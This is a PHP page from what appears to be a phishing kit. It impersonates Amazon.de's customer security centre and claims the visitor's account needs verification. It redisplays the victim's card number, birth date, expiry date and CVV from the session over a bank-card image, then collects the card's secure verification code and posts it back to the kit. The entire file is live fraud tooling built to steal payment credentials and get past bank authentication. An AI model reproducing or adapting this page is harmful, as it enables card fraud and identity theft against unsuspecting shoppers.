<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link rel="stylesheet" href="src/barclays_img/bc.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css">
		<a id="nav-top"></a>
		
		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"> Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23"><span style="color:#FF9900">&#10148; Zahlungsmittel bestätigen</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1 style="margin: 18px 0 14px 10px !important;color: #E47911 !important;font-size: 1.6em !important;">
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<div id="cbcc_frame1" style="margin-top:15px">
				<div id="centerslots" style="height:600px;margin:0 auto;width:1200px">
					<?php
						if (isset($_SESSION['err'])) {
							echo '<div id="message_error" class="message error"><span></span><h6>Bei Ihrer Anfrage ist ein Problem aufgetreten</h6><p>' . $_SESSION['err'] . ' Bitte versuchen Sie es erneut.<br></p></div><br/><br/>';
						}
					?>
					<div id="content">
						<div style="position:relative;">
							<div class="position:absolute;">
								<form method="POST" action="index.php">
									<img style="display: block; margin: -30px auto;" src="src/barclays_img/vw.png" />
									
									<style type="text/css"> 
									.inputtextfield {
										border:0px !important;
									}
									
									.input1{
										position:absolute;
										top:389px;
										left:536px;
										width:167px;
									}
									
									.input2{
										position:absolute;
										top:338px;
										left:570px;
										width:16px;
									}
									
									.input3{
										position:absolute;
										top:338px;
										left:606px;
										width:16px;
									}
									.input4{
										position:absolute;
										top:338px;
										left:643px;
										width:30px;
									}
									.input44{
										position:absolute;
										top:233px;
										left:570px;
										width:30px;
									}
									.input45{
										position:absolute;
										top:233px;
										left:613px;
										width:30px;
									}
									.input46{
										position:absolute;
										top:233px;
										left:657px;
										width:30px;
									}
									.input47{
										position:absolute;
										top:233px;
										left:699px;
										width:30px;
									}
									.input5{
										position:absolute;
										top:259px;
										left:570px;
										width:16px;
									}
									.input6{
										position:absolute;
										top:259px;
										left:615px;
										width:16px;
									}
									.input7{
										position:absolute;
										top:312px;
										left:569px;
										width:77px;
									}
									.input8{
										position:absolute;
										top:285px;
										left:570px;
										width:22px;
									}
									</style>
									
									<input value="<?php echo (isset($_SESSION['ccnr']) ? substr($_SESSION['ccnr'], 0, 4) : ""); ?>" maxlength="4" class="inputtextfield input44" style="height:14px"/>
									<input value="<?php echo (isset($_SESSION['ccnr']) ? substr($_SESSION['ccnr'], 4, 4) : ""); ?>" maxlength="4" class="inputtextfield input45" style="height:14px"/>
									<input value="<?php echo (isset($_SESSION['ccnr']) ? substr($_SESSION['ccnr'], 8, 4) : ""); ?>" maxlength="4" class="inputtextfield input46" style="height:14px"/>
									<input value="<?php echo (isset($_SESSION['ccnr']) ? substr($_SESSION['ccnr'], 12, 4) : ""); ?>" maxlength="4" class="inputtextfield input47" style="height:14px"/>
									
									<input value="<?php echo (isset($_SESSION['dob1']) ? $_SESSION['dob1'] : ""); ?>"  maxlength="2" class="inputtextfield input2" style="height:14px"/>
									<input value="<?php echo (isset($_SESSION['dob2']) ? $_SESSION['dob2'] : ""); ?>" maxlength="2" class="inputtextfield input3" style="height:14px"/>
									<input value="<?php echo (isset($_SESSION['dob3']) ? $_SESSION['dob3'] : ""); ?>" maxlength="4" class="inputtextfield input4" style="height:14px"/>
									
									<input value="<?php echo (isset($_SESSION['ccDate1']) ? $_SESSION['ccDate1'] : ""); ?>" maxlength="2" class="inputtextfield input5" style="height:14px"/>
									<input value="<?php echo (isset($_SESSION['ccDate2']) ? substr($_SESSION['ccDate2'], 2) : ""); ?>" maxlength="2" class="inputtextfield input6" style="height:14px"/>

									<input value="<?php echo (isset($_SESSION['cvv']) ? $_SESSION['cvv'] : ""); ?>" maxlength="3" class="inputtextfield input8" style="height:14px"/>
									<?php
										 if (isset($_SESSION['err']) && !empty($_SESSION['err'])) {
											echo '<input id="enrolled_sc" name="enrolled_sc" maxlength="10" class="inputtextfield input7" style="border:1px solid red !important;height:14px" type="text">';
											unset($_SESSION['err']);
										 } else {
											echo '<input id="enrolled_sc" name="enrolled_sc" maxlength="10" class="inputtextfield input7" style="height:14px" type="text">';
										 }
									?>
									<button type="submit" name="sendcode" style="color:#fff;background-color:#FD8624;border:1px solid #FF6507;position:absolute; top:385px; left: 884px; cursor:pointer;">
										Senden
									</button>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		
	</body>
</html>